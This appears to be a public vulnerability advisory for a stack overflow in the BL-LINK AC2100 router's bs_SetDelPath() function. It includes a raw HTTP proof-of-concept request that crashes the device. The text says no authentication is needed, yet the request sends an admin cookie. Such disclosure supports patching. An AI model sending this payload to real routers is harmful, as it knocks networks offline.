# BL-LINK AC2100 has stack overflow vulnerability.

Vendor: https://www.b-link.net.cn/

download：https://www.b-link.net.cn/download/BL-AC2100_AC10_OP(V1.0.3)%E5%8D%87%E7%BA%A7%E5%9B%BA%E4%BB%B6.html

Product：BLINK-AC2100

Version： v1.0.3

Vulnerability function：bs_SetDelPath() in libshare-0.0.26.so.

## describe

The Blink AC2100 router's Web management interface contains a serious vulnerability of denial-of-service vulnerability in the delshrpath function, which allows malicious attackers to remotely paralyze the network without requiring authentication throught http request.

## **Code analysis**    

In the so library of AC2100, the bs_SetDelPath function retrieves the type parameter, adds it to the json string, and calls strcpy(a2,a11), resulting in a stack overflow vulnerability. This vulnerability can be exploited to gain server privileges or cause a denial of service attack.
<img width="689" height="695" alt="Image" src="https://github.com/user-attachments/assets/488efee2-4977-414a-bb95-64625a4c6fa8" />


## POC

```
POST /goform/set_delshrpath_cfg HTTP/1.1
Host: 192.168.15.1
Content-Length: 2604
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.15.1
Referer: http://192.168.15.1/admin/terminal.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: platform=0; user=admin
Connection: close

path=a&type=1*0x100
```

<img width="1472" height="753" alt="Image" src="https://github.com/user-attachments/assets/d489ba8b-8879-48dd-bd68-b97894fae011" />


**Result**

It caused the router and the network to crash.
